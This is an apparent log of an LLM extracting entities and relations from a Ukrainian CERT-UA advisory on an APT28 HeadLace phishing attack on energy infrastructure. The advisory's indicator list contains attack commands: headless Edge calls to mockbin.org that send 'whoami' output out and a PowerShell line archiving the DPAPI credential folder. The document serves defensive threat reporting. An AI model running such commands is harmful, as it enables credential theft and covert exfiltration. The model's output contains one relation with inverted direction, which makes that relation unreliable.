@@ -1,0 +1,299 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA зафіксовано цільову кібератаку у відношенні об'єкту критичної енергетичної інфраструктури України.</p><p>Для реалізації зловмисного задуму розповсюджено повідомлення електронної пошти з підробленою адресою відправника та посиланням на архів, наприклад, "photo.zip".</p><p>Відвідування посилання призведе до завантаження на ЕОМ жертви ZIP-архіву, що містить три JPG-зображення (приманки) та BAT-файл "weblinks.cmd". У випадку запуску CMD-файлу буде відкрито декілька вебсторінок-приманок, створено файли ".bat" і ".vbs", а також здійснено запуск VBS-файлу, який, у свою чергу, виконає BAT-файл.</p><p>Зазначене призведе до звернення до URL-адреси за допомогою програми Microsoft Edge в "headless" режимі, в результаті чого на ЕОМ в каталозі "%USERPROFILE%\Downloads" буде створено файл з розширенням ".css", який згодом буде переміщено до каталогу "%PROGRAMDATA%" з розширенням ".cmd", виконано та видалено.</p><p>Під час дослідження на ЕОМ було завантажено CMD-файл, призначений для виконання команди "whoami" та передачі результату за допомогою HTTP GET-запиту, виконаного за допомогою програми Microsoft Edge в "headless" режимі.</p><p>У процесі контрольованої емуляції ураження додатково з'ясовано, що на ЕОМ жертви з файлового сервісу file.io буде здійснено завантаження програми TOR та створення "прихованих" сервісів, призначених для перенаправлення інформаційних потоків через мережу TOR на відповідні хости локальної обчислювальної мережі, зокрема, контролер домену (порти: 445, 389, 3389) та поштовий сервер (порти: 443, 445, 3389). Крім того, для отримання хешу паролю облікового запису використано PowerShell-сценарій, що відкриває сокет та ініціює SMB-підключення до нього за допомогою команди "net use".</p><p>При цьому, віддалене виконання команд реалізовано за допомогою "curl" через API легітимного сервісу webhook.site; персистентність забезпечено шляхом створення запланованих задач для запуску VBS-скрипта з BAT-файлом у якості аргументу.</p><p>Завдяки обмеженню можливості доступу до вебресурсів сервісу Mockbin (mockbin.org, mocky.io) та блокуванню запуску Windows Script Host (зокрема, "wscript.exe") на ЕОМ, відповідальному співробітникові згаданого об'єкту критичної енергетичної інфраструктури вдалося запобігти кібератаці. Зауважимо, що в контексті детектування та протидії доцільно також звернути увагу на запуск "curl" та "msedge" з параметром "--headless=new".</p><p>Очевидно, що з метою обходу засобів захисту зловмисники продовжують використовувати функціонал штатних програм (так звані LOLBAS - Living Off The Land Binaries, Scripts and Libraries), а для створення каналу управління зловживають відповідними сервісами.&nbsp;</p><p>Описана активність здійснюється угрупуванням APT28. При цьому, один з перших випадків використання сервісу Mockbin зафіксовано у квітні 2023 року.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">76dd1a509028dab3e45613f2f5b062f0&nbsp; &nbsp; ab7d21d81de1039345f9b08d5b64b3c015ea70a15d7ff1194f5f073ca1fbbe23&nbsp; &nbsp; photo.zip
+4b6880d3b614548fec6426b8caea2840&nbsp; &nbsp; 8c268cf8d0bbe3ab1f25f5fdc205c14e30d78a63cc43c5ffbd0733e44fe31b5c&nbsp; &nbsp; lilikeeper.JPG
+9ff8225ea895e8e8a9f1d768bc41ba77&nbsp; &nbsp; 47569fbf80dda804b4ea00c5678d4d98113c3b1f2e52630d191524c615b885a8&nbsp; &nbsp; pollymodel.JPG
+20d7223482ed78acedb3bd19e4b98a46&nbsp; &nbsp; aab6b46c209305b4fef7c7bfc16cc9ada1e937ef322cf9b3f5107d65fe59eabb&nbsp; &nbsp; candy_girl_ua.JPG
+80067d1c66f79910ddad67d17998851c&nbsp; &nbsp; 1c47e40a2f4dc93ed5b8253278799a4cd70890ec968512ade54b5767707f9a7b&nbsp; &nbsp; weblinks.cmd
+b7c7dc5d07ddd105e0c6de37967b5aa9&nbsp; &nbsp; 561ab624c7214e3b21edd97bf575d5ec0ff7da25b1ae374e616f27a99ca0b77b&nbsp; &nbsp; photo.zip
+4b6880d3b614548fec6426b8caea2840&nbsp; &nbsp; 8c268cf8d0bbe3ab1f25f5fdc205c14e30d78a63cc43c5ffbd0733e44fe31b5c&nbsp; &nbsp; lilikeeper.JPG
+9ff8225ea895e8e8a9f1d768bc41ba77&nbsp; &nbsp; 47569fbf80dda804b4ea00c5678d4d98113c3b1f2e52630d191524c615b885a8&nbsp; &nbsp; pollymodel.JPG
+20d7223482ed78acedb3bd19e4b98a46&nbsp; &nbsp; aab6b46c209305b4fef7c7bfc16cc9ada1e937ef322cf9b3f5107d65fe59eabb&nbsp; &nbsp; candy_girl_ua.JPG
+74e07e9b83c3967578e2b8c88f7c20d1&nbsp; &nbsp; 4b4fbfb0f201d6b80f22cbf1c8d6b1fb2e1a155ce37d426065167e10239062aa&nbsp; &nbsp; weblinks.cmd
+8718966fa7ad85b5be84655251f2a8fe&nbsp; &nbsp; 9b6b926b7089d401a6f73094167a6144dd3f6e485128cc28b449d917da79018a&nbsp; &nbsp; %GUID%.vbs
+a8085a7b624d572de024e53871da49ea&nbsp; &nbsp; af4d7ad40e505d047f9df078ef3f6c7e0207c882dc91705e2f4190cc7d2360ce&nbsp; &nbsp; %GUID%.bat (HeadLace)
+3951e4409e66a767af53ee9a920386b9&nbsp; &nbsp; d03373be2435af1966bfdfe51ae6d0038e4d4f3c353b63fea41144d144547121&nbsp; &nbsp; l09y3n.css (HeadLace)
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">arunmishra1974@portugalmail.pt
+louw@seznam.cz
+hXXps://mockbin[.]org/bin/%GUID%
+hXXps://mockbin[.]org/bin/%GUID%/%whoami%
+hXXps://run.mocky[.]io/v3/%GUID%
+hXXps://webhook[.]site/%GUID%
+mockbin[.]org (Легітимний сервіс)
+mocky[.]io (Легітимний сервіс)
+run.mocky[.]io (Легітимний сервіс)
+webhook[.]site (Легітимний сервіс)
+file[.]io (Легітимний сервіс)
+ipapi[.]co (Легітимний сервіс)
+185.220.100[.]253 (Received)
+173.239.196[.]198
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%PROGRAMDATA%\l09y3n.cmd
+%PROGRAMDATA%\z201qo.cmd
+%PROGRAMDATA%\%GUID%.bat
+%PROGRAMDATA%\%GUID%.vbs
+%PROGRAMDATA%\Lotus\Data\config.ini
+%PROGRAMDATA%\Lotus\service\ManagementService\authorized_clients
+%PROGRAMDATA%\Lotus\LotusManagementNowService.exe
+C:\Windows\System32\Tasks\Lotus\LotusManagementNowService
+C:\Windows\System32\WScript.exe %PROGRAMDATA%\%GUID%.vbs
+C:\Windows\system32\cmd.exe /c ""%TMP%\Rar$DIa2664.20414\weblinks.cmd" "
+C:\Windows\system32\cmd.exe /c ""%PROGRAMDATA%\%GUID%.bat" "
+start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/%GUID%
+start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/%GUID%/%whoami%
+powershell Compress-Archive %USERPROFILE%\AppData\Roaming\Microsoft\Protect %USERPROFILE%\AppData\Roaming\Microsoft\protect.zip
+powershell.exe Test-NetConnection -ComputerName %IP% -Port 389
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p><p></p><p>Рис.2 Приклади запланованих завдань, скриптів та PowerShell-сценарію</p>
+
+=== RESPONSE (7.5s, in 3793 / out 2072 tok, STOP) ===
+```json
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "APT28",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage group associated with the GRU."
+    },
+    {
+      "name": "HeadLace",
+      "kind": "malware family",
+      "gloss": "A multi-stage malware campaign and toolset attributed to APT28."
+    },
+    {
+      "name": "photo.zip",
+      "kind": "archive file",
+      "gloss": "A malicious ZIP archive used as an initial lure containing decoy images and a batch script."
+    },
+    {
+      "name": "weblinks.cmd",
+      "kind": "script file",
+      "gloss": "A malicious batch script used to launch decoy web pages and drop further script components."
+    },
+    {
+      "name": "lilikeeper.JPG",
+      "kind": "image file",
+      "gloss": "A decoy JPEG image distributed inside a malicious archive."
+    },
+    {
+      "name": "pollymodel.JPG",
+      "kind": "image file",
+      "gloss": "A decoy JPEG image distributed inside a malicious archive."
+    },
+    {
+      "name": "candy_girl_ua.JPG",
+      "kind": "image file",
+      "gloss": "A decoy JPEG image distributed inside a malicious archive."
+    },
+    {
+      "name": "l09y3n.css",
+      "kind": "script file",
+      "gloss": "A malicious script disguised with a CSS extension associated with HeadLace malware."
+    },
+    {
+      "name": "Microsoft Edge",
+      "kind": "software product",
+      "gloss": "A web browser developed by Microsoft."
+    },
+    {
+      "name": "TOR",
+      "kind": "software product",
+      "gloss": "Free and open-source software for enabling anonymous communication."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework by Microsoft."
+    },
+    {
+      "name": "curl",
+      "kind": "software product",
+      "gloss": "A command-line tool for transferring data with URLs."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software product",
+      "gloss": "A Windows component that allows administrators and users to automate tasks via scripts."
+    },
+    {
+      "name": "wscript.exe",
+      "kind": "software product",
+      "gloss": "An executable file of Windows Script Host used to execute scripts."
+    },
+    {
+      "name": "LotusManagementNowService.exe",
+      "kind": "executable file",
+      "gloss": "A suspicious executable deployed as a service during the attack."
+    },
+    {
+      "name": "Mockbin",
+      "kind": "web service",
+      "gloss": "An online service for creating custom HTTP endpoints and mocking APIs."
+    },
+    {
+      "name": "mockbin.org",
+      "kind": "internet domain",
+      "gloss": "The primary domain name for the Mockbin API testing service."
+    },
+    {
+      "name": "mocky.io",
+      "kind": "internet domain",
+      "gloss": "A web domain offering HTTP response mocking services."
+    },
+    {
+      "name": "run.mocky.io",
+      "kind": "internet domain",
+      "gloss": "A subdomain of mocky.io used to execute mock HTTP responses."
+    },
+    {
+      "name": "webhook.site",
+      "kind": "internet domain",
+      "gloss": "A legitimate online service for receiving and inspecting HTTP webhooks."
+    },
+    {
+      "name": "file.io",
+      "kind": "internet domain",
+      "gloss": "An ephemeral file sharing service used to host and download payloads."
+    },
+    {
+      "name": "ipapi.co",
+      "kind": "internet domain",
+      "gloss": "An online service providing IP address geolocation and network information APIs."
+    },
+    {
+      "name": "arunmishra1974@portugalmail.pt",
+      "kind": "email address",
+      "gloss": "A spoofed or malicious email address used in phishing activity."
+    },
+    {
+      "name": "louw@seznam.cz",
+      "kind": "email address",
+      "gloss": "An email address used in malicious email communications."
+    },
+    {
+      "name": "185.220.100.253",
+      "kind": "ip address",
+      "gloss": "An IP address observed in malicious network activity."
+    },
+    {
+      "name": "173.239.196.198",
+      "kind": "ip address",
+      "gloss": "An IP address observed in malicious network activity."
+    }
+  ],
+  "relations": [
+    {
+      "head": "APT28",
+      "type": "carried-out-by",
+      "tail": "HeadLace",
+      "evidence": "Описана активність здійснюється угрупуванням APT28."
+    },
+    {
+      "head": "APT28",
+      "type": "abuses-service",
+      "tail": "Mockbin",
+      "evidence": "один з перших випадків використання сервісу Mockbin зафіксовано у квітні 2023 року."
+    },
+    {
+      "head": "photo.zip",
+      "type": "contains-file",
+      "tail": "weblinks.cmd",
+      "evidence": "ZIP-архіву, що містить три JPG-зображення (приманки) та BAT-файл \"weblinks.cmd\""
+    },
+    {
+      "head": "photo.zip",
+      "type": "contains-file",
+      "tail": "lilikeeper.JPG",
+      "evidence": "ZIP-архіву, що містить три JPG-зображення (приманки)"
+    },
+    {
+      "head": "photo.zip",
+      "type": "contains-file",
+      "tail": "pollymodel.JPG",
+      "evidence": "ZIP-архіву, що містить три JPG-зображення (приманки)"
+    },
+    {
+      "head": "photo.zip",
+      "type": "contains-file",
+      "tail": "candy_girl_ua.JPG",
+      "evidence": "ZIP-архіву, що містить три JPG-зображення (приманки)"
+    },
+    {
+      "head": "weblinks.cmd",
+      "type": "executes-via",
+      "tail": "Microsoft Edge",
+      "evidence": "звернення до URL-адреси за допомогою програми Microsoft Edge в \"headless\" режимі"
+    },
+    {
+      "head": "APT28",
+      "type": "downloads-payload-from",
+      "tail": "file.io",
+      "evidence": "з файлового сервісу file.io буде здійснено завантаження програми TOR"
+    },
+    {
+      "head": "curl",
+      "type": "communicates-with",
+      "tail": "webhook.site",
+      "evidence": "віддалене виконання команд реалізовано за допомогою \"curl\" через API легітимного сервісу webhook.site"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "carried-out-by",
+      "definition": "Specifies that a campaign or activity is executed or operated by a particular threat actor."
+    },
+    {
+      "name": "abuses-service",
+      "definition": "Indicates that an actor or malware leverages a legitimate online platform or service for malicious operations."
+    },
+    {
+      "name": "contains-file",
+      "definition": "Identifies a file or resource packaged inside another archive or container."
+    },
+    {
+      "name": "executes-via",
+      "definition": "Specifies a legitimate application or binary invoked to run commands or execute tasks."
+    },
+    {
+      "name": "downloads-payload-from",
+      "definition": "Identifies an external service or host from which malware or tools are downloaded."
+    },
+    {
+      "name": "communicates-with",
+      "definition": "Describes network interaction or API communication between a tool and a remote web service."
+    }
+  ]
+}
+```
